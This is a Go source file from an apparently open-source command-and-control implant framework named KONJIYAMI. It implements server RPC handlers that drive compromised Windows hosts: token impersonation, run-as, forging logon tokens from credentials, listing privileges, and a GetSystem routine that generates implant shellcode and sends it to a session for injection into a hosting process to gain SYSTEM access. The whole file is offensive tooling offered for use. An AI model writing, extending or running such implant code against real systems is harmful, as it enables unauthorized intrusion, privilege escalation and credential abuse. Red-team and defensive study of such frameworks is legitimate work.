package rpc

/*
	KONJIYAMI Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"os"
	"path"

	"konjiyami/protobuf/clientpb"
	"konjiyami/protobuf/commonpb"
	"konjiyami/protobuf/konjiyamipb"
	"konjiyami/server/codenames"
	"konjiyami/server/core"
	"konjiyami/server/cryptography"
	"konjiyami/server/generate"

	"google.golang.org/protobuf/proto"
)

// Impersonate - Impersonate a remote user
func (rpc *Server) Impersonate(ctx context.Context, req *konjiyamipb.ImpersonateReq) (*konjiyamipb.Impersonate, error) {
	resp := &konjiyamipb.Impersonate{Response: &commonpb.Response{}}
	err := rpc.GenericHandler(req, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

// RunAs - Run a remote process as a specific user
func (rpc *Server) RunAs(ctx context.Context, req *konjiyamipb.RunAsReq) (*konjiyamipb.RunAs, error) {
	resp := &konjiyamipb.RunAs{Response: &commonpb.Response{}}
	err := rpc.GenericHandler(req, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

// RevToSelf - Revert process context to self
func (rpc *Server) RevToSelf(ctx context.Context, req *konjiyamipb.RevToSelfReq) (*konjiyamipb.RevToSelf, error) {
	resp := &konjiyamipb.RevToSelf{Response: &commonpb.Response{}}
	err := rpc.GenericHandler(req, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

// CurrentTokenOwner - Retrieve the thread token's owner
func (rpc *Server) CurrentTokenOwner(ctx context.Context, req *konjiyamipb.CurrentTokenOwnerReq) (*konjiyamipb.CurrentTokenOwner, error) {
	resp := &konjiyamipb.CurrentTokenOwner{Response: &commonpb.Response{}}
	err := rpc.GenericHandler(req, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

// GetSystem - Attempt to get 'NT AUTHORITY/SYSTEM' access on a remote Windows system
func (rpc *Server) GetSystem(ctx context.Context, req *clientpb.GetSystemReq) (*konjiyamipb.GetSystem, error) {
	var shellcode []byte
	session := core.Sessions.Get(req.Request.SessionID)
	if session == nil {
		return nil, ErrInvalidSessionID
	}

	name := path.Base(req.Config.GetName())
	shellcode, _, err := getKONJIYAMIShellcode(name)
	if err != nil {
		name, config := generate.ImplantConfigFromProtobuf(req.Config)
		if name == "" {
			name, err = codenames.GetCodename()
			if err != nil {
				return nil, err
			}
		}
		config.Format = clientpb.OutputFormat_SHELLCODE
		config.ObfuscateSymbols = false
		otpSecret, _ := cryptography.TOTPServerSecret()
		err = generate.GenerateConfig(name, config, true)
		if err != nil {
			return nil, err
		}
		shellcodePath, err := generate.KONJIYAMIShellcode(name, otpSecret, config, true)
		if err != nil {
			return nil, err
		}
		shellcode, _ = os.ReadFile(shellcodePath)
	}
	data, err := proto.Marshal(&konjiyamipb.InvokeGetSystemReq{
		Data:           shellcode,
		HostingProcess: req.HostingProcess,
		Request:        req.GetRequest(),
	})
	if err != nil {
		return nil, err
	}

	timeout := rpc.getTimeout(req)
	data, err = session.Request(konjiyamipb.MsgInvokeGetSystemReq, timeout, data)
	if err != nil {
		return nil, err
	}
	getSystem := &konjiyamipb.GetSystem{}
	err = proto.Unmarshal(data, getSystem)
	if err != nil {
		return nil, err
	}
	return getSystem, nil
}

// MakeToken - Creates a new logon session to impersonate a user based on its credentials.
func (rpc *Server) MakeToken(ctx context.Context, req *konjiyamipb.MakeTokenReq) (*konjiyamipb.MakeToken, error) {
	resp := &konjiyamipb.MakeToken{Response: &commonpb.Response{}}
	err := rpc.GenericHandler(req, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

// GetPrivs - gRPC interface to get privilege information from the current process
func (rpc *Server) GetPrivs(ctx context.Context, req *konjiyamipb.GetPrivsReq) (*konjiyamipb.GetPrivs, error) {
	resp := &konjiyamipb.GetPrivs{Response: &commonpb.Response{}}
	err := rpc.GenericHandler(req, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

